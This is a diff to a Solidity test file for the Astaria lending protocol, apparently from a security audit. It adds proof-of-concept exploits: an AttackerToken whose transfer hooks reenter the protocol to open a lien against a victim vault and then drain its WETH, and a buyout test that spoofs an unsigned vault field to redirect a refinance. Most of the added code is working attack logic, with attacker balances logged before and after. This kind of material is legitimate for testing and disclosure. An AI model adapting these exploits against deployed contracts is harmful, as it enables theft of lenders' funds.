@@ -44,6 +44,106 @@ import {WithdrawProxy} from "../WithdrawProxy.sol";
 import {Strings2} from "./utils/Strings2.sol";
 
 import "./TestHelpers.t.sol";
+import {ERC20} from "solmate/tokens/ERC20.sol";
+
+contract AttackerToken is ERC20, TestHelpers {
+  using CollateralLookup for address;
+  bool attack = false;
+  address victim;
+  ILienToken.Stack[] stack;
+  address tokenContract;
+  uint256 tokenId;
+  ILienToken lienToken;
+  ICollateralToken collatToken;
+  IAstariaRouter router;
+
+  constructor() ERC20("AttackerToken", "ATK", uint8(18)) {}
+
+  function transferFrom(
+    address from,
+    address to,
+    uint256 amount
+  ) public override returns (bool) {
+    balanceOf[to] += amount;
+    if (attack) {
+      attack = false;
+      _startAttack();
+    }
+    return true;
+  }
+
+  function transfer(address to, uint256 amount) public override returns (bool) {
+    balanceOf[to] += amount;
+    if (attack) {
+      attack = false;
+      _startAttack();
+    }
+    return true;
+  }
+
+  function setAttack(
+    address _victim,
+    ILienToken.Stack memory _stack,
+    address _tokenContract,
+    uint256 _tokenId,
+    ILienToken _lienToken,
+    ICollateralToken _collatToken,
+    IAstariaRouter _router
+  ) public {
+    attack = true;
+    victim = _victim;
+    stack.push(_stack);
+    tokenContract = _tokenContract;
+    tokenId = _tokenId;
+    lienToken = _lienToken;
+    collatToken = _collatToken;
+    router = _router;
+  }
+
+  function _startAttack() private {
+    lienToken.makePayment(stack[0].lien.collateralId, stack, 0, 10000 ether);
+
+    IAstariaRouter.Commitment[]
+      memory commitments = new IAstariaRouter.Commitment[](1);
+
+    ILienToken.Stack[] memory emptyStack = new ILienToken.Stack[](0);
+
+    commitments[0] = _generateValidTerms({
+      vault: victim,
+      strategist: strategistOne,
+      strategistPK: strategistOnePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: standardLienDetails,
+      amount: 10 ether,
+      stack: emptyStack
+    });
+    collatToken.setApprovalForAll(address(router), true);
+    router.commitToLiens(commitments);
+  }
+
+  function drain(ERC20 WETH9) public {
+    WETH9.transfer(msg.sender, WETH9.balanceOf(address(this)));
+  }
+}
+
+contract WorthlessToken is ERC20 {
+  constructor() ERC20("WorthlessToken", "WTK", uint8(18)) {}
+
+  function transferFrom(
+    address from,
+    address to,
+    uint256 amount
+  ) public override returns (bool) {
+    balanceOf[to] += amount;
+    return true;
+  }
+
+  function transfer(address to, uint256 amount) public override returns (bool) {
+    balanceOf[to] += amount;
+    return true;
+  }
+}
 
 contract RefinanceTesting is TestHelpers {
   using FixedPointMathLib for uint256;
@@ -805,7 +905,6 @@ contract RefinanceTesting is TestHelpers {
 
     skip(9 days + 500);
 
-
     address privateVault = _createPrivateVault({
       strategist: strategistOne,
       delegate: strategistTwo
@@ -837,5 +936,188 @@ contract RefinanceTesting is TestHelpers {
       refinanceTerms
     );
     vm.stopPrank();
+  }
+
+  function testBuyoutVuln1() public {
+    uint256 alicePK = uint256(0x8888); // malicious user
+    address alice = vm.addr(alicePK);
+    address bob = address(2); // normal user
+    WorthlessToken wt = new WorthlessToken();
+
+    address goodPublicVault = _createPublicVault({
+      strategist: strategistOne,
+      delegate: strategistTwo,
+      epochLength: 14 days
+    });
+
+    _lendToVault(Lender({addr: bob, amountToLend: 100 ether}), goodPublicVault);
+
+    vm.startPrank(alice);
+    TestNFT nft = new TestNFT(2);
+    address tokenContract = address(nft);
+    uint256 tokenId = uint256(0);
+    uint256 tokenId2 = uint256(1);
+    address badPublicVault = ASTARIA_ROUTER.newPublicVault(
+      14 days,
+      alice,
+      address(wt),
+      0,
+      false,
+      new address[](0),
+      uint256(0)
+    );
+
+    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
+      vault: badPublicVault,
+      strategist: alice,
+      strategistPK: alicePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: ILienToken.Details({
+        maxAmount: 100 ether,
+        rate: (uint256(1e16) * 150) / (365 days),
+        duration: 10 days,
+        maxPotentialDebt: 100 ether,
+        liquidationInitialAsk: 500 ether
+      }),
+      amount: 90 ether,
+      isFirstLien: true
+    });
+
+    vm.stopPrank();
+
+    ILienToken.Details memory sameRateRefinance = ILienToken.Details({
+      maxAmount: 100 ether,
+      rate: (uint256(1e16) * 150) / (365 days),
+      duration: 20 days,
+      maxPotentialDebt: 100 ether,
+      liquidationInitialAsk: 500 ether
+    });
+
+    IAstariaRouter.Commitment memory refinanceTerms = _generateValidTerms({
+      vault: goodPublicVault,
+      strategist: strategistOne,
+      strategistPK: strategistOnePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: sameRateRefinance,
+      amount: 90 ether,
+      stack: stack
+    });
+    refinanceTerms.lienRequest.strategy.vault = badPublicVault;
+
+    // observe that the signature and merkle stuff have already been obtained
+    // so the following step is essentially spoofing a field which is not included in the merkle tree and signature
+    // and we'll see that this will still pass the signature test
+
+    console.log(
+      PublicVault(goodPublicVault).totalAssets(),
+      WETH9.balanceOf(goodPublicVault)
+    );
+
+    // make sure that alice is tx.origin
+    vm.prank(alice, alice);
+    (stack, ) = VaultImplementation(goodPublicVault).buyoutLien(
+      stack,
+      uint8(0),
+      refinanceTerms
+    );
+
+    _warpToEpochEnd(goodPublicVault);
+
+    console.log(
+      PublicVault(goodPublicVault).totalAssets(),
+      WETH9.balanceOf(goodPublicVault)
+    );
+
+    LIEN_TOKEN.makePayment(stack[0].lien.collateralId, stack, 1000 ether);
+    console.log(
+      PublicVault(goodPublicVault).totalAssets(),
+      WETH9.balanceOf(goodPublicVault)
+    );
+  }
+
+  function testReentrancyVuln() public {
+    uint256 alicePK = uint256(0x8888); // malicious user
+    address alice = vm.addr(alicePK);
+    address bob = address(2); // normal user
+    AttackerToken AT = new AttackerToken();
+
+    address victimVault = _createPublicVault({
+      strategist: strategistOne,
+      delegate: strategistTwo,
+      epochLength: 14 days
+    });
+
+    _lendToVault(Lender({addr: bob, amountToLend: 100 ether}), victimVault);
+
+    vm.startPrank(alice);
+    TestNFT nft = new TestNFT(2);
+    address tokenContract = address(nft);
+    uint256 tokenId = uint256(0);
+    uint256 tokenId2 = uint256(1);
+    address attackerVault = ASTARIA_ROUTER.newPublicVault(
+      14 days,
+      alice,
+      address(AT),
+      0,
+      false,
+      new address[](0),
+      uint256(0)
+    );
+    console.log("Attacker balance before: ", WETH9.balanceOf(alice));
+    (uint256[] memory liens, ILienToken.Stack[] memory stack) = _commitToLien({
+      vault: attackerVault,
+      strategist: alice,
+      strategistPK: alicePK,
+      tokenContract: tokenContract,
+      tokenId: tokenId,
+      lienDetails: ILienToken.Details({
+        maxAmount: 100 ether,
+        rate: (uint256(1e16) * 150) / (365 days),
+        duration: 10 days,
+        maxPotentialDebt: 100 ether,
+        liquidationInitialAsk: 500 ether
+      }),
+      amount: 90 ether,
+      isFirstLien: true
+    });
+
+    COLLATERAL_TOKEN.safeTransferFrom(
+      alice,
+      address(AT),
+      stack[0].lien.collateralId
+    );
+
+    AT.setAttack(
+      victimVault,
+      stack[0],
+      tokenContract,
+      tokenId,
+      LIEN_TOKEN,
+      COLLATERAL_TOKEN,
+      ASTARIA_ROUTER
+    );
+
+    stack = LIEN_TOKEN.makePayment(
+      stack[0].lien.collateralId,
+      stack,
+      0,
+      5 ether
+    );
+
+    // verifies that the lien with victimVault isn't included in the collateralState
+    assertEq(stack.length, 1);
+    assertEq(tokenContract.computeId(tokenId), stack[0].lien.collateralId);
+    assertEq(
+      keccak256(abi.encode(stack)),
+      LIEN_TOKEN.getCollateralState(tokenContract.computeId(tokenId))
+    );
+    assertEq(stack[0].lien.vault, attackerVault);
+
+    AT.drain(WETH9);
+    vm.stopPrank();
+
+    console.log("Attacker balance after: ", WETH9.balanceOf(alice));
   }
 }
